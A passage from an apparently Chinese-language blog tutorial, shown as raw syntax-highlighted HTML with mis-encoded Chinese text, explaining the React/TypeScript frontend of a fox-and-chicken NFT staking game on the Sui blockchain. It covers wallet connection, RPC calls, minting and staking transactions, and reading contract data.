class="attr">src</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.url</span>&#125;`&#125; <span class="attr">width</span>=<span class="string">&#123;48&#125;</span> <span class="attr">height</span>=<span class="string">&#123;48&#125;</span> <span class="attr">alt</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.objectId</span>&#125;`&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> itemIn ? removeUnstaked(item.objectId) : addUnstaked(item.objectId)&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¤„ç†è´¨æŠ¼çš„</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderStaked</span>(<span class="params">item: <span class="built_in">any</span>, <span class="keyword">type</span>: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> itemIn = stakedSelected.<span class="title function_">includes</span>(item.<span class="property">objectId</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span>=<span class="string">&#123;item.objectId&#125;</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">marginRight:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">marginLeft:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">border:</span> <span class="attr">itemIn</span> ? &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">red</span>&quot; <span class="attr">:</span> &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">rgb</span>(<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>)&quot;, <span class="attr">overflow:</span> &#x27;<span class="attr">hidden</span>&#x27;, <span class="attr">display:</span> &quot;<span class="attr">inline-block</span>&quot; &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;flex flex-col items-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontSize:</span> &quot;<span class="attr">0.75rem</span>&quot;, <span class="attr">height:</span> &quot;<span class="attr">1rem</span>&quot; &#125;&#125;&gt;</span>#&#123;item.index&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">src</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.url</span>&#125;`&#125; <span class="attr">width</span>=<span class="string">&#123;48&#125;</span> <span class="attr">height</span>=<span class="string">&#123;48&#125;</span> <span class="attr">alt</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.objectId</span>&#125;`&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> itemIn ? removeStaked(item.objectId) : addStaked(item.objectId)&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="4-3-lian-jie-qian-bao">4.3 è¿æ¥é’±åŒ…</span></h3><p>æˆ‘ä»¬ä½¿ç”¨ Suiet é’±åŒ…å¼€å‘çš„ <code>@suiet/wallet-kit</code> åŒ…è¿æ¥ Sui é’±åŒ…ï¼Œä»åŒ…å¯¹åº”çš„ WalletContextState å¯ä»¥çœ‹å‡ºï¼Œ <code>useWallet</code> åŒ…å«äº†æˆ‘ä»¬åœ¨æ„å»º App æ—¶ä¼šä½¿ç”¨åˆ°çš„åŸºæœ¬ä¿¡æ¯å’ŒåŠŸèƒ½ï¼Œæ¯”å¦‚é’±åŒ…ä¿¡æ¯ï¼Œé“¾ä¿¡æ¯ï¼Œè¿æ¥çŠ¶æ€ä¿¡æ¯ï¼Œä»¥åŠå‘é€äº¤æ˜“ï¼Œç­¾åä¿¡æ¯ç­‰ã€‚</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">WalletContextState</span> &#123;</span><br><span class="line">    <span class="attr">configuredWallets</span>: <span class="title class_">IWallet</span>[];</span><br><span class="line">    <span class="attr">detectedWallets</span>: <span class="title class_">IWallet</span>[];</span><br><span class="line">    <span class="attr">allAvailableWallets</span>: <span class="title class_">IWallet</span>[];</span><br><span class="line">    <span class="attr">chains</span>: <span class="title class_">Chain</span>[];</span><br><span class="line">    <span class="attr">chain</span>: <span class="title class_">Chain</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">adapter</span>: <span class="title class_">IWalletAdapter</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">account</span>: <span class="title class_">WalletAccount</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">address</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">connecting</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    <span class="attr">connected</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    <span class="attr">status</span>: <span class="string">&quot;disconnected&quot;</span> | <span class="string">&quot;connected&quot;</span> | <span class="string">&quot;connecting&quot;</span>;</span><br><span class="line">    <span class="attr">select</span>: <span class="function">(<span class="params">walletName: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    <span class="attr">disconnect</span>: <span class="function">() =&gt;</span> <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt;;</span><br><span class="line">    <span class="attr">getAccounts</span>: <span class="function">() =&gt;</span> <span class="keyword">readonly</span> <span class="title class_">WalletAccount</span>[];</span><br><span class="line">    <span class="title function_">signAndExecuteTransaction</span>(<span class="attr">transaction</span>: <span class="title class_">SuiSignAndExecuteTransactionInput</span>): <span class="title class_">Promise</span>&lt;<span class="title class_">SuiSignAndExecuteTransactionOutput</span>&gt;;</span><br><span class="line">    <span class="attr">signMessage</span>: <span class="function">(<span class="params">input: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">        message: <span class="built_in">Uint8Array</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;</span>) =&gt;</span> <span class="title class_">Promise</span>&lt;<span class="title class_">ExpSignMessageOutput</span>&gt;;</span><br><span class="line">    <span class="attr">on</span>: &lt;E <span class="keyword">extends</span> <span class="title class_">WalletEvent</span>&gt;<span class="function">(<span class="params">event: E, listener: WalletEventListeners[E]</span>) =&gt;</span> <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">declare</span> <span class="keyword">const</span> <span class="title class_">WalletContext</span>: <span class="keyword">import</span>(<span class="string">&quot;react&quot;</span>).<span class="property">Context</span>&lt;<span class="title class_">WalletContextState</span>&gt;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">useWallet</span>(<span class="params"></span>): <span class="title class_">WalletContextState</span>;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>src/components/SuiConnect.tsx</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„è®¾ç½®é’±åŒ…è¿æ¥åŠŸèƒ½ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">ConnectButton</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@suiet/wallet-kit&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">SuiConnect</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">ConnectButton</span>&gt;</span>Connect Wallet<span class="tag">&lt;/<span class="name">ConnectButton</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬å°†éœ€è¦ä½¿ç”¨çš„ä¿¡æ¯åœ¨ <code>src/pages/game.tsx</code> ä¸­å¼•å…¥ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  useWallet,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@suiet/wallet-kit&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; signAndExecuteTransaction, connected, account, status &#125; = <span class="title function_">useWallet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// çœç•¥</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>signAndExecuteTransaction</code> æ–¹æ³•ç”¨æ¥ç­¾åå¹¶æ‰§è¡Œäº¤æ˜“ï¼Œæ”¯æŒ <code>moveCall</code> ï¼Œ <code>transferSui</code>ï¼Œ <code>transferObject</code> ç­‰äº¤æ˜“ã€‚</p><h3><span id="4-4-rpc-jie-kou-diao-yong">4.4 RPC æ¥å£è°ƒç”¨</span></h3><p>æˆ‘ä»¬ä½¿ç”¨å®˜æ–¹æä¾›çš„ <code>@mysten/sui.js</code> åº“è°ƒç”¨ Sui çš„ RPC æ¥å£ï¼Œè¿™ä¸ªåº“æ”¯æŒäº†å¤§éƒ¨åˆ† <a href="https://docs.sui.io/sui-jsonrpc">Sui JSON-RPC</a>ï¼ŒåŒæ—¶ï¼Œè¿˜æä¾›äº†ä¸€äº›é¢å¤–çš„æ–¹æ³•æ–¹ä¾¿å¼€å‘ï¼Œä¾‹å¦‚ï¼š</p><ul><li><code>selectCoinsWithBalanceGreaterThanOrEqual</code> ï¼šè·å–å¤§äºç­‰äºæŒ‡å®šæ•°é‡çš„coinå¯¹è±¡IDæ•°ç»„</li><li><code>selectCoinSetWithCombinedBalanceGreaterThanOrEqual</code>ï¼šè·å–æ€»å’Œå¤§äºç­‰äºæŒ‡å®šæ•°é‡çš„coinå¯¹è±¡IDæ•°ç»„</li></ul><p>è¿™ä¸¤ä¸ªæ–¹æ³•åœ¨éœ€è¦åœ¨ NFT é“¸é€ æ—¶æ”¯ä»˜ SUI æˆ–è€…å…¶ä»–ä»£å¸æ—¶ååˆ†æœ‰ç”¨ã€‚æˆ‘ä»¬åœ¨ <code>game.tsx</code> ä¸­å¼•å…¥ JsonProvider è¿›è¡Œåˆå§‹åŒ–ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶: src/pages/game.tsx</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">JsonRpcProvider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@mysten/sui.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// æ“ä½œ client</span></span><br><span class="line">  <span class="keyword">const</span> provider = <span class="keyword">new</span> <span class="title class_">JsonRpcProvider</span>();</span><br><span class="line">    <span class="comment">// è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">const</span> suiObjects = <span class="keyword">await</span> provider.<span class="title function_">selectCoinSetWithCombinedBalanceGreaterThanOrEqual</span>(account!.<span class="property">address</span>, suiCost)</span><br><span class="line"><span class="comment">// å…¶ä»–çœç•¥</span></span><br></pre></td></tr></table></figure><p>å…¶ä»–æ–¹æ³•çš„ä»‹ç»å¯ä»¥å‚è€ƒåº“çš„æ–‡æ¡£ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚</p><h3><span id="4-5-zhu-zao-nft-deng-entry-fang-fa">4.5 é“¸é€  NFT ç­‰ entry æ–¹æ³•</span></h3><p>æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°å¦‚ä½•é“¸é€  NFTï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶: src/pages/game.tsx </span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">mint_nft</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> suiObjectIds = [] <span class="keyword">as</span> <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> eggObiectIds = [] <span class="keyword">as</span> <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line">        <span class="comment">// è·å–è¶³å¤Ÿçš„ SUI æˆ–è€… EGG ä»£å¸çš„å¯¹è±¡ID</span></span><br><span class="line">    <span class="keyword">if</span> (collectionSupply &lt; <span class="variable constant_">PAID_TOKENS</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> suiObjects = <span class="keyword">await</span> provider.<span class="title function_">selectCoinSetWithCombinedBalanceGreaterThanOrEqual</span>(account!.<span class="property">address</span>, suiCost)</span><br><span class="line">      suiObjectIds = suiObjects.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> eggObjects = <span class="keyword">await</span> provider.<span class="title function_">selectCoinSetWithCombinedBalanceGreaterThanOrEqual</span>(account!.<span class="property">address</span>, eggCost, <span class="string">`<span class="subst">$&#123;PACKAGE_ID&#125;</span>::egg::EGG`</span>)</span><br><span class="line">      eggObiectIds = eggObjects.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨ moveCall æ–¹æ³•ï¼Œæ„é€ äº¤æ˜“å¹¶ç­¾å</span></span><br><span class="line">      <span class="keyword">const</span> resData = <span class="keyword">await</span> <span class="title function_">signAndExecuteTransaction</span>(&#123;</span><br><span class="line">        <span class="attr">transaction</span>: &#123;</span><br><span class="line">          <span class="attr">kind</span>: <span class="string">&#x27;moveCall&#x27;</span>,</span><br><span class="line">          <span class="attr">data</span>: <span class="title function_">mint</span>(<span class="literal">false</span>, suiObjectIds, eggObiectIds),</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;);</span><br><span class="line">            <span class="comment">// æ£€æŸ¥ç»“æœ</span></span><br><span class="line">      <span class="keyword">if</span> (resData.<span class="property">effects</span>.<span class="property">status</span>.<span class="property">status</span> !== <span class="string">&quot;success&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>, resData);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// è®¾ç½® Mint äº¤æ˜“</span></span><br><span class="line">      <span class="title function_">setMintTx</span>(<span class="string">&#x27;https://explorer.sui.io/transaction/&#x27;</span> + resData.<span class="property">certificate</span>.<span class="property">transactionDigest</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;failed&#x27;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ„é€  mint æ–¹æ³•æ‰€éœ€è¦çš„å‚æ•°</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">stake: <span class="built_in">boolean</span>, sui_objects: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt;, egg_objects: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">packageObjectId</span>: <span class="variable constant_">PACKAGE_ID</span>,</span><br><span class="line">      <span class="attr">module</span>: <span class="string">&#x27;fox&#x27;</span>,</span><br><span class="line">      <span class="attr">function</span>: <span class="string">&#x27;mint&#x27;</span>,</span><br><span class="line">      <span class="attr">typeArguments</span>: [],</span><br><span class="line">      <span class="attr">arguments</span>: [</span><br><span class="line">        <span class="variable constant_">GLOBAL</span>, <span class="variable constant_">EGG_TREASUTY</span>, mintAmount.<span class="title function_">toString</span>(), stake, sui_objects, egg_objects</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">gasBudget</span>: <span class="number">1000000</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">        <span class="comment">// å…¶ä»–éƒ¨åˆ†çœç•¥</span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;text-center font-console pt-1&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> mint_nft()&#125;&gt;Mint<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>arguments</code> å‚æ•°å¯¹åº” mint æ–¹æ³•æ‰€éœ€è¦çš„å‚æ•°ã€‚</p><p>åŒç†ï¼Œå…¶ä»–çš„ entry æ–¹æ³•çš„è°ƒç”¨å’Œç­¾åä¹Ÿä¸ Mint æ–¹æ³•ç±»ä¼¼ï¼Œåˆ†åˆ«ä¸ºï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é“¸é€ å¹¶è´¨æŠ¼</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">mint_nft_stake</span>(<span class="params"></span>)</span><br><span class="line"><span class="comment">// è´¨æŠ¼</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">stake_nft</span>(<span class="params"></span>)</span><br><span class="line"><span class="comment">// æå–</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">unstake_nft</span>(<span class="params"></span>)</span><br><span class="line"><span class="comment">// æ”¶é›† EGG</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">claim_egg</span>(<span class="params"></span>)</span><br></pre></td></tr></table></figure><h3><span id="4-6-he-yue-shu-ju-du-qu">4.6 åˆçº¦æ•°æ®è¯»å–</span></h3><p>å¯¹äº Sui å…¬é“¾ï¼Œé™¤äº†è°ƒç”¨åˆçº¦ï¼Œå¦ä¸€å—éš¾ç‚¹æ˜¯åˆçº¦æ•°æ®çš„è¯»å–ã€‚ç›¸å¯¹äº EVM åˆçº¦ï¼ŒMoveçš„åˆçº¦æ•°æ®ç»“æ„æ›´å¤æ‚ï¼Œæ›´éš¾è¯»å–ã€‚ç”±äºåœ¨ Sui ä¸­ï¼ŒObject å¯¹è±¡è¢«åŒ…è£…åå¯èƒ½æ— æ³•è¿›è¡Œè¿½è¸ªï¼ˆè¯¦æƒ…å¯ä»¥å‚è€ƒå®˜æ–¹ <a href="https://docs.sui.io/build/programming-with-objects">Object æ•™ç¨‹ç³»åˆ—</a>ï¼‰ï¼Œå› æ­¤åœ¨ä¹‹å‰çš„æ•°æ®ç»“æ„è®¾è®¡ä¸­ï¼ŒPack å’Œ Barn ä¸­å­˜å‚¨çš„ NFT éœ€è¦ä½¿ç”¨èƒ½è¿›è¡Œè¿½è¸ªçš„æ•°æ®ç»“æ„ã€‚å› æ­¤ï¼ŒObjectTable è¢«åšä¸ºåŸºæœ¬çš„é”®å€¼å­˜å‚¨ç»“æ„åŒºåˆ«äºä¸å¯è¿½è¸ªçš„ Table æ•°æ®ç±»å‹ã€‚ç›¸åº”åœ°ï¼Œå¯ä»¥ä½¿ç”¨  <code>sui_getDynamicFieldObject</code> æ¥è¯»å–å…¶ä¸­çš„æ•°æ®ï¼Œä¾‹å¦‚ï¼Œé€šè¿‡è¯»å–ä¿å­˜åœ¨ PackStaked ä¸­çš„ NFT å¯¹è±¡è´¨æŠ¼åˆ—è¡¨ï¼Œä»è€Œé€šè¿‡ <code>getObjectBatch</code> å¯ä»¥è·å–å½“å‰åœ°å€æ‰€æœ‰çš„è´¨æŠ¼çš„ NFTã€‚</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¯»å– Pack ä¸­è´¨æŠ¼çš„ Fox NFT</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">objects</span>: <span class="built_in">any</span> = <span class="keyword">await</span> sui_client.<span class="title function_">getDynamicFieldObject</span>(packStakedObject, account!.<span class="property">address</span>);</span><br><span class="line">  <span class="keyword">if</span> (objects != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fox_staked = objects.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">value</span></span><br><span class="line">    <span class="keyword">const</span> fox_stakes = <span class="keyword">await</span> provider.<span class="title function_">getObjectBatch</span>(fox_staked)</span><br><span class="line">    <span class="keyword">const</span> staked = fox_stakes.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> foc = item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">item</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">objectId</span>: foc.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>,</span><br><span class="line">        <span class="attr">index</span>: <span class="built_in">parseInt</span>(foc.<span class="property">fields</span>.<span class="property">index</span>),</span><br><span class="line">        <span class="attr">url</span>: foc.<span class="property">fields</span>.<span class="property">url</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">setStakedFox</span>(staked)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>packStakedObject</code> å¯¹è±¡IDé€šè¿‡ <code>GLOBAL</code> å¯¹è±¡ ID è·å–å¾—åˆ°ã€‚</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">const</span> <span class="attr">globalObject</span>: <span class="built_in">any</span> = <span class="keyword">await</span> provider.<span class="title function_">getObject</span>(<span class="variable constant_">GLOBAL</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pack_staked = globalObject.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">pack</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span></span><br><span class="line"><span class="title function_">setPackStakedObject</span>(pack_staked)</span><br></pre></td></tr></table></figure><p>å¯¹äºå½“å‰åœ°å€æ‰€æ‹¥æœ‰çš„æœªè´¨æŠ¼çš„NFTï¼Œéœ€è¦é€šè¿‡è¯»å–å…¨éƒ¨å¯¹è±¡IDåè¿›è¡Œç±»å‹è¿‡æ»¤æ‰èƒ½å¾—åˆ°ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">        <span class="comment">// è·å–æ‰€æœ‰å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">const</span> objects = <span class="keyword">await</span> provider.<span class="title function_">getObjectsOwnedByAddress</span>(account!.<span class="property">address</span>)</span><br><span class="line"><span class="comment">// è¿‡æ»¤ FoxOrChicken å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">const</span> foc = objects</span><br><span class="line">  .<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">type</span> === <span class="string">`<span class="subst">$&#123;PACKAGE_ID&#125;</span>::token_helper::FoxOrChicken`</span>)</span><br><span class="line">  .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">objectId</span>)</span><br><span class="line"><span class="keyword">const</span> foces = <span class="keyword">await</span> provider.<span class="title function_">getObjectBatch</span>(foc)</span><br><span class="line">        <span class="comment">// è¿‡æ»¤å¹¶è¯»å–ä¿¡æ¯ï¼Œç„¶åæ’åº</span></span><br><span class="line"><span class="keyword">const</span> unstaked = foces.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">objectId</span>: item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>,</span><br><span class="line">    <span class="attr">index</span>: <span class="built_in">parseInt</span>(item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">index</span>),</span><br><span class="line">    <span class="attr">url</span>: item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">url</span>,</span><br><span class="line">    <span class="attr">is_chicken</span>: item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">is_chicken</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">sort</span>(<span class="function">(<span class="params">n1, n2</span>) =&gt;</span> n1.<span class="property">index</span> - n2.<span class="property">index</span>)</span><br><span class="line">        <span class="comment">// å­˜å‚¨</span></span><br><span class="line"><span class="title function_">setUnstakedFox</span>(unstaked.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">is_chicken</span>))</span><br><span class="line"><span class="title function_">setUnstakedChicken</span>(unstaked.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">is_chicken</span>))</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå¯¹äºå½“å‰åœ°å€ä¸­åŒ…å«çš„ EGG ä»£å¸çš„ä½™é¢ï¼Œå¯ä»¥é€šè¿‡ <code>getCoinBalancesOwnedByAddress</code> è·å¾—æ‰€æœ‰ä½™é¢å¯¹è±¡å¹¶è¿›è¡Œæ±‚å’Œå¾—åˆ°ã€‚</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> balanceObjects = <span class="keyword">await</span> provider.<span class="title function_">getCoinBalancesOwnedByAddress</span>(account!.<span class="property">address</span>, <span class="string">`<span class="subst">$&#123;PACKAGE_ID&#125;</span>::egg::EGG`</span>)</span><br><span class="line"><span class="keyword">const</span> balances = balanceObjects.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&#x27;Exists&#x27;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">parseInt</span>(item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">balance</span>))</span><br><span class="line"><span class="keyword">const</span> initialValue = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> sumWithInitial = balances.<span class="title function_">reduce</span>(</span><br><span class="line">  <span class="function">(<span class="params">accumulator, currentValue</span>) =&gt;</span> accumulator + currentValue,</span><br><span class="line">  initialValue</span><br><span class="line">)</span><br><span class="line"><span class="title function_">setEggBalance</span>(sumWithInitial);</span><br></pre></td></tr></table></figure><h2><span id="zong-jie">æ€»ç»“</span></h2><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†ç‹ç‹¸æ¸¸æˆåˆçº¦å’Œå‰ç«¯ä»£ç çš„ä»‹ç»ã€‚æˆ‘ä»¬å®ç°çš„ç‹ç‹¸æ¸¸æˆè™½ç„¶åŠŸèƒ½ä¸Šåªæœ‰é“¸é€ ï¼Œè´¨æŠ¼å’Œæå–è¿™å‡ ä¸ªä¸»è¦çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ¶‰åŠ NFT åˆ›å»ºä»¥åŠ Sui Move çš„è¯¸å¤šè¯­æ³•ï¼Œæ•´ä½“é¡¹ç›®å…·æœ‰ä¸€å®šçš„éš¾åº¦ã€‚</p><p>è¿™ç¯‡æ–‡ç« å¸Œæœ›å¯¹æœ‰å…´è¶£äº Sui ä¸Šçš„ NFT 